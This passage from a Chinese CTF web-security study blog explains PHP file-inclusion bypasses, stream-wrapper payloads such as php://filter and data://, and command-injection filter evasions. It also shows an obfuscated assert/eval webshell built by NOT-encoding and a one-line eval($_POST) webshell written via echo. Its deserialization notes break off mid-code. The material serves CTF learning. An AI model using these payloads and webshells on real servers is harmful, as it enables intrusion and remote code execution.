</span><br><span class="line">            @<span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);     </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;       </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Sorry, you can not pass&quot;</span>);     </span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/labour$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line">                  @<span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$d</span>);       </span><br><span class="line">                  <span class="keyword">echo</span> (<span class="variable">$a</span>);     </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;                                      <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);     </span><br><span class="line">                                    &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;why?&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p><strong>文章关键：</strong></p>
<p><u><strong>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再require_once。</strong></u></p>
<p><u><strong>今天就来谈谈，怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</strong></u></p>
<p><u><strong>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过</strong></u></p>
<p>payload:</p>
<p>?d=0://labour/../../../../../flll1ag2.txt&amp;ctf=laiya</p>
<h4 id="2-php伪协议："><a href="#2-php伪协议：" class="headerlink" title="2.php伪协议："></a>2.php伪协议：</h4><p>内容来自于<a target="_blank" rel="noopener" href="https://blog.csdn.net/qz362228/article/details/124359070">https://blog.csdn.net/qz362228/article/details/124359070</a></p>
<p><img src="https://img-blog.csdnimg.cn/92c9df98952f41669db5d8b8b2ffaead.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h5 id="1-php-协议"><a href="#1-php-协议" class="headerlink" title="1.php://协议"></a>1.php://协议</h5><p>​    <strong>·条件：</strong></p>
<p><code>allow_url_fopen:off/on</code><br><code>allow_url_include</code> :仅<code>php://input</code> <code>php://stdin</code> <code>php://memory</code> <code>php://temp</code> 需要<code>on</code></p>
<p><strong>·作用：</strong></p>
<p><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
<p>  <strong>·说明</strong>：</p>
<p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<h5 id="2-php-filter伪协议"><a href="#2-php-filter伪协议" class="headerlink" title="2.php://filter伪协议"></a>2.php://filter伪协议</h5><p>   <strong>·条件</strong></p>
<p><code>allow_url_fopen=on/off</code><br><code>allow_url_include=on/off</code></p>
<p>只是<code>读取</code>，需要开启 allow_url_fopen，不需要开启 allow_url_include</p>
<p>​    <strong>·说明：</strong><br>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写<br>①输出进行<code>base64</code>加密后的信息</p>
<p><code>?file=php://filter/convert.base64-encode/resource=xx.php</code><br><code>或</code><br><code>?file=php://filter/read=convert.base64-encode/resource=xx.php</code></p>
<p>②获得将base64加密后的信息后，再将其解密，得出原信息</p>
<h5 id="3-php-input（读取POST数据）"><a href="#3-php-input（读取POST数据）" class="headerlink" title="3.php://input（读取POST数据）"></a>3.php://input（读取POST数据）</h5><p>   <strong>·条件</strong></p>
<p><code>allow_url_fopen=on/off</code><br><code>allow_url_include=on</code></p>
<p>   <strong>·说明</strong><br>可以访问请求的原始数据的只读流。在post请求中能查看请求的原始数据，<u><strong>并将post请求中的post数据当作php代码执行</strong></u>。（只读流是说只能进行读操作的数据）</p>
<p><code>例如</code></p>
<p>下面的POST数据里的命令就会被执行</p>
<p><img src="/2022/05/28/Web-study/image-20220801143739625.png" alt="image-20220801143739625"></p>
<p>即可以<u>直接读取到POST上</u>没有经过解析的原始数据。 <strong>enctype=”multipart/form-data”</strong> 的时候 php://input 是<strong>无效</strong>的</p>
<p><code>注</code> ：查看当前运行的是哪个php.ini<br>2,3需要将php可执行加入环境变量, 如果没有加,那么请使用php可执行文件所在位置的完整路径代替</p>
<p>1.打印出phpinfo();，找到Loaded Configuration File那一行</p>
<p><img src="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png" alt="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png"></p>
<p>2.命令行输入<code>php -i |grep php.ini</code>（<code>php -i</code>其实就是输出phpinfo();)</p>
<p>3.<code>php -r “phpinfo();” |grep php.ini</code></p>
<h5 id="4-file-伪协议（读取文件内容）"><a href="#4-file-伪协议（读取文件内容）" class="headerlink" title="4.file://伪协议（读取文件内容）"></a>4.file://伪协议（读取文件内容）</h5><p>   <strong>·条件</strong></p>
<p><code>allow_url_fopen=on/off</code><br><code>allow_url_include=on/off</code> （均不受影响）</p>
<p>打ctf中常用于读取本地文件</p>
<p><code>?file=file://C:\Windows\System32\drivers\etc\hosts</code></p>
<p><img src="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h5 id="5-phar-伪协议-读取压缩包文件内容"><a href="#5-phar-伪协议-读取压缩包文件内容" class="headerlink" title="5.phar://伪协议(读取压缩包文件内容)"></a>5.phar://伪协议(读取压缩包文件内容)</h5><p>   <strong>·条件</strong></p>
<p><code>allow_url_fopen: off/on</code><br><code>allow_url_include: off/on (均不受影响)</code></p>
<p><code>注</code>：php 版本大于等于<code>5.3.0</code>，压缩包需要是<code>zip</code>协议压缩，<code>rar</code>不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p>
<p>  <strong>·格式</strong></p>
<p><code>?file=phar://压缩包名/内部文件名</code><br><code>例：phar://x.zip/x.php</code></p>
<h5 id="6-zip-伪协议"><a href="#6-zip-伪协议" class="headerlink" title="6.zip://伪协议"></a>6.zip://伪协议</h5><p>zip伪协议和phar协议类似，但是用法不一样（url不同）</p>
<p>​    <strong>·条件</strong></p>
<p><code>allow_url_fopen: off/on</code><br><code>allow_url_include: off/on (均不受影响)</code></p>
<p>   <strong>·格式</strong></p>
<p><code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code>   </p>
<p><code>例： zip://D:\phpstudy\WWW\x.zip%23shell.php       #-&gt;%23</code></p>
<h5 id="7-data-伪协议-读取文件"><a href="#7-data-伪协议-读取文件" class="headerlink" title="7.data://伪协议(读取文件)"></a>7.data://伪协议(读取文件)</h5><p>（可以直接达到执行php代码的效果）<br>和<code>php://input</code>很像，<code>php://input</code>以<code>post</code>提交数据那样提交数据，<br><code>data://</code>是以<code>get</code>方式提交数据，也是可以执行提交的脚本</p>
<p>​     <strong>·格式</strong></p>
<p><code>?file=data://text/plain,&lt;?php%20phpinfo()?&gt;</code></p>
<p>如果对特殊字符进行了过滤，可以通过base64编码后再输入</p>
<p><code>data://text/plain;base64,base64加密的代码</code></p>
<p>可配合<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/7831529.html">php命令执行漏洞</a>，实现对一些数据的获取<br>如：<code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
<h5 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.总结</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dreamthe/article/details/121765876">参考实例1</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/106658417">参考实例2</a></p>
<hr>
<h3 id="八、逻辑漏洞"><a href="#八、逻辑漏洞" class="headerlink" title="八、逻辑漏洞"></a>八、逻辑漏洞</h3><hr>
<h3 id="九、命令执行"><a href="#九、命令执行" class="headerlink" title="九、命令执行"></a>九、命令执行</h3><h4 id="1-有关命令执行的知识（windows-或-linux-下）"><a href="#1-有关命令执行的知识（windows-或-linux-下）" class="headerlink" title="1.有关命令执行的知识（windows 或 linux 下）:"></a>1.有关命令执行的知识（windows 或 linux 下）:</h4><p>1）command1 ; command2 用;隔开表示为多个命令，命令按照从左到右的顺序执行，彼此无关联，所有的命令都会执行。先执行 command1 后执行 command2</p>
<p>2）command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</p>
<p>3）command1 | command2 将两个命令分开，左边命令的输出作为右边命令的输入，只执行 command2</p>
<p>4）command1 &amp; command2 &amp;表示任务后台执行，与nohup命令功能差不多，先执行 command2 后执行 command1</p>
<p>5）command1 || command2 先执行 command1，如果为假，再执行 command2</p>
<p>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</p>
<p>eg:</p>
<p>find  / -name “flag* “<br>在当前目录及其子目录下查找文件名中包含flag的文件<br>find  / -name “ *.txt”<br>在当前目录及其子目录下查找后缀为txt的文件</p>
<h4 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h4><h5 id="1-过滤cat"><a href="#1-过滤cat" class="headerlink" title="1.过滤cat"></a>1.过滤cat</h5><p><code>more，less，head，tac</code>    都可以对文本进行读取</p>
<h5 id="2-过滤空格"><a href="#2-过滤空格" class="headerlink" title="2.过滤空格"></a>2.过滤空格</h5><p><code>IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</code>来代替空格</p>
<p><code>&lt;,&gt;</code>是把内容导向某个地方，可以是文件，也可以是命令</p>
<p>如<code>cat&lt;flag.php</code>就是相当于，把flag.php内容用cat命令显示出来</p>
<p><code>%09</code>是tab键，可以补全内容</p>
<p>比如过滤了flag，但是需要访问flag233.php</p>
<p>那么就可以<code>cat %09*233.php</code>，就可以了</p>
<h5 id="3-过滤目录分隔符"><a href="#3-过滤目录分隔符" class="headerlink" title="3.过滤目录分隔符"></a>3.过滤目录分隔符</h5><p>也就是/不能用了，不能直接查看文件目录</p>
<p><code>cat /flag_is_here/flag_9012297169124.php</code></p>
<p>可以<strong>利用分号使两个命令同时进行</strong>也就是</p>
<p><code>127.0.0.1;cd flag_is_here;cat flag_9012297169124.php</code></p>
<h5 id="4-过滤运算符"><a href="#4-过滤运算符" class="headerlink" title="4.过滤运算符"></a>4.过滤运算符</h5><p>可以用;代替管道运算符</p>
<h5 id="5-绕过正则匹配"><a href="#5-绕过正则匹配" class="headerlink" title="5.绕过正则匹配"></a>5.绕过正则匹配</h5><p>比如</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)</span></span>)</span><br></pre></td></tr></table></figure></div>

<p>所有大小写字母和数字都被正则匹配过滤了</p>
<p>这里就需要</p>
<p>法一：取反绕过：</p>
<p><u><strong>取反</strong>就是将数字转化为二进制,再把二进制中的1变成0,0变成1</u></p>
<p><code>~</code>是取反符号，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br><span class="line"></span><br><span class="line"><span class="comment">//php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</span></span><br></pre></td></tr></table></figure></div>

<p>然后再赋值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XQUERY"><figure class="iseeu highlight /xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?code=(~<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>)(~<span class="meta">%9A</span><span class="meta">%89</span><span class="meta">%9E</span><span class="meta">%93</span><span class="meta">%D7</span><span class="meta">%DB</span><span class="meta">%A0</span><span class="meta">%AD</span><span class="meta">%BA</span><span class="meta">%AE</span><span class="meta">%AA</span><span class="meta">%BA</span><span class="meta">%AC</span><span class="meta">%AB</span><span class="meta">%A4</span><span class="meta">%C7</span><span class="meta">%A2</span><span class="meta">%D6</span>);</span><br><span class="line"></span><br><span class="line">//注意后面要有；，代表php代码结束</span><br><span class="line">//这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反</span><br><span class="line">等同于</span><br><span class="line">?code=(assert)(eval(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])),(assert)因为是assert是函数，被当作函数执行，于是因为断言(eval(<span class="variable">$_REQUEST</span>[<span class="number">8</span>]))，所以把eval(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])当作php执行，于是就可以拿到shell了</span><br><span class="line"></span><br><span class="line">蚁剑连接</span><br><span class="line">http://url?code=(~<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>)(~<span class="meta">%9A</span><span class="meta">%89</span><span class="meta">%9E</span><span class="meta">%93</span><span class="meta">%D7</span><span class="meta">%DB</span><span class="meta">%A0</span><span class="meta">%AD</span><span class="meta">%BA</span><span class="meta">%AE</span><span class="meta">%AA</span><span class="meta">%BA</span><span class="meta">%AC</span><span class="meta">%AB</span><span class="meta">%A4</span><span class="meta">%C7</span><span class="meta">%A2</span><span class="meta">%D6</span>);</span><br></pre></td></tr></table></figure></div>





<p>法2：异或绕过:</p>
<p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br> 例如：异或 <code>?</code> 和 <code>~</code> 之后得到的是 <code>A</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  00‭11 1111‬</span><br><span class="line">字符：~         ASCII码：126          二进制： <span class="number"> 0111 </span>1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR  <span class="number"> 0 </span>  =   1</span><br><span class="line">0   XOR  <span class="number"> 1 </span>  =   1</span><br><span class="line">0   XOR  <span class="number"> 0 </span>  =   0</span><br><span class="line">1   XOR  <span class="number"> 1 </span>  =   0</span><br><span class="line">上述两个字符异或得到 二进制： <span class="number"> 0100 </span>0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br></pre></td></tr></table></figure></div>

<p>本题preg_replace()过滤了<code>所有英文字母和数字</code>，但是<em>ASCII码中还有很多<code>字母数字之外的字符</code>，利用这些字符进行异或可以得到我们想要的字符</em></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COS"><figure class="iseeu highlight /cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS：取<span class="keyword">ASCII</span>表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</span><br></pre></td></tr></table></figure></div>

<h5 id="6-绕过长度限制"><a href="#6-绕过长度限制" class="headerlink" title="6.绕过长度限制"></a>6.绕过长度限制</h5><p><code>&gt;</code>和<code>&gt;&gt;</code>两个符号的使用</p>
<p>使用<code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入</p>
<p><img src="/2022/05/28/Web-study/image-20220926223728694.png" alt="image-20220926223728694"></p>
<p><code>&gt;&gt;</code>符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</p>
<p><img src="/2022/05/28/Web-study/image-20220926223749908.png" alt="image-20220926223749908"></p>
<h4 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2.常用命令"></a>2.常用命令</h4><p>ls</p>
<p>cat</p>
<p>touch【创建文件，一般创建脚本文件，</p>
<p>比如<code>touch haha.php</code></p>
<p>然后再执行<code>echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;&gt;&gt;haha.php</code>，在脚本文件里写一串一句话木马</p>
<p><strong>但是注意因为有$，后面的看可能会被当做变量，所以可以加上反斜杠\转义</strong></p>
<p><code>echo &quot;&lt;?php @eval(\$_POST[&#39;cmd&#39;]);?&gt;&quot;&gt;&gt;haha.php</code></p>
<p>】</p>
<hr>
<h3 id="十、暴力破解"><a href="#十、暴力破解" class="headerlink" title="十、暴力破解"></a>十、暴力破解</h3><p>一把搜哈就完事（奸笑）</p>
<hr>
<h3 id="十一、反序列化"><a href="#十一、反序列化" class="headerlink" title="十一、反序列化"></a>十一、反序列化</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Onlyone_1314/article/details/121461984?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&utm_relevant_index=2">原文链接1</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/377676274">原文链接2</a></p>
<h4 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h4><p>  <strong>序列化</strong>(Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p>
<h4 id="php的序列化和反序列化"><a href="#php的序列化和反序列化" class="headerlink" title="php的序列化和反序列化"></a>php的序列化和反序列化</h4><p>概念：<code>php的序列化将对象转化为了字符串，包含了对象的所有数据信息，</code><br><code>反序列化时再根据这些信息还原对象。</code></p>
<p>  <u>php的序列化和反序列化由serialize()和unserialize()</u>这两个函数来完成。serialize()完成序列化的操作，将传入的值转换为序列化后的字符串；而unserialize()完成反序列化的操作，将字符串转换成原来的变量。</p>
<p><code>serialize(mixed $value): string</code><br>        serialize()返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方：</p>
<p><code>O::&quot;&quot;::&#123;&lt;field name 1&gt;&lt;field value 1&gt;…&#125;</code><br><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>  当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 wakeup() 成员函数。<br><code>unserialize(string $str): mixed</code><br>  unserialize()对单一的已序列化的变量进行操作，将其转换回 PHP 的值。<br>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 wakeup() 成员函数（如果存在的话）。</p>
<p>注意：</p>
<p>private声明</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HAML"><figure class="iseeu highlight /haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。</span><br><span class="line"></span><br><span class="line">因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度</span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">%<span class="selector-tag">00</span></span>也就是空字符，无法复制，只能自己修改二进制，或者自己加上</span><br></pre></td></tr></table></figure></div>



<h4 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45552960/article/details/102664372">原文链接</a></p>
<p>  PHP中以两个下划线开头的方法，<code>__construct(),__destruct(),__call(),__callStatic(),__get(),__set(),__isset(),__unset(),__sleep(),__wakeup(),__toString(),__set_state(),__clone()，__autoload()</code>等，被称为”魔术方法”（Magic methods）。这些方法在一定条件下有特殊的功能，在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能</p>
<p>与序列化和反序列化的魔术方法主要是：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__construct</span>()	<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__destruct</span>() 	<span class="comment">//对象被销毁时触发</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__wakeup</span>() 	<span class="comment">//使用unserialize时触发</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__sleep</span>() 	<span class="comment">//使用serialize时触发</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__toString</span>() 	<span class="comment">//把类当做字符串时触发</span></span><br><span class="line">&#123;因为echo无法输出对象，所以可以利用该魔法方法，在直接输出对象引用的时候，就不会产生错误，而是自动调用了”<span class="built_in">__toString</span>()”方法, 输出“<span class="built_in">__toString</span>()”方法中返回的字符，所以“<span class="built_in">__toString</span>()”方法一定要有个返回值(return 语句)&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">__get</span>() 	<span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__set</span>() 	<span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__invoke</span>()  <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__call</span>()     <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__callStatic</span>()  <span class="comment">//在静态上下文中调用不可访问的属性</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__isset</span>()   <span class="comment">//当对不可访问属性调用isset()或empty()时调用</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__set_state</span>()   <span class="comment">//调用var_export()导出类时，此静态方法会被调用。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__clone</span>()  <span class="comment">//当对象复制完成时调用</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__autoload</span>()   <span class="comment">//尝试加载未定义的类</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__debugInfo</span>()   <span class="comment">//打印所需调试信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">·注意：PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。</span><br><span class="line"></span><br><span class="line">·<span class="built_in">__sleep</span>() 和 <span class="built_in">__wakeup</span>()</span><br><span class="line">public __sleep ( void ) : array</span><br><span class="line">__wakeup ( void ) : void</span><br><span class="line"></span><br><span class="line">serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">（<span class="number">1</span>）__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。</span><br><span class="line">（<span class="number">2</span>）__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</span><br><span class="line">（<span class="number">3</span>）与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span><br><span class="line">（<span class="number">4</span>）__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</span><br><span class="line"></span><br><span class="line">·访问控制</span><br><span class="line">PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</span><br><span class="line">public（公有）：公有的类成员可以在任何地方被访问。</span><br><span class="line">protected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。</span><br><span class="line">private（私有）：私有的类成员则只能被其定义所在的类访问。</span><br><span class="line"></span><br><span class="line">·unserialize() 将已序列化的字符串还原回 PHP 的值。</span><br><span class="line">序列化请使用 serialize() 函数。</span><br><span class="line"></span><br><span class="line">语法</span><br><span class="line">unserialize(str)</span><br><span class="line"></span><br><span class="line">参数 描述</span><br><span class="line">str 必需。一个序列化字符串。</span><br><span class="line">__wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。</span><br></pre></td></tr></table></figure></div>



<hr>
<h5 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h5><p><code>__construct()</code>被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。但是在<code>序列化</code>和<code>反序列化</code>过程是不会触发的。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span 